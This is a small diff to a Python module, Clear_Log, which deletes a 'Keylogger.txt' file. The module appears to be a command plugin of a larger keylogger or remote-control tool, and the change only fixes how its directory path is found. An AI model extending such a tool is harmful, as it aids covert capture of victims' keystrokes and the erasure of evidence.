@@ -1,11 +1,12 @@
 import os
 class Clear_Log():
 	def __init__(self, _):
+		self.__file__ = _.__file__
 		self.Send_Message = _.Send_Message
 		self.Main()
 
 	def Main(self):
-		dirname = "\\".join(os.path.abspath(__file__).split("\\")[:-1])
+		dirname = "\\".join(os.path.abspath(self.__file__).split("\\")[:-1])
 		filename = dirname + "\Keylogger.txt"
 		if os.path.exists(filename):
 			os.remove(filename)
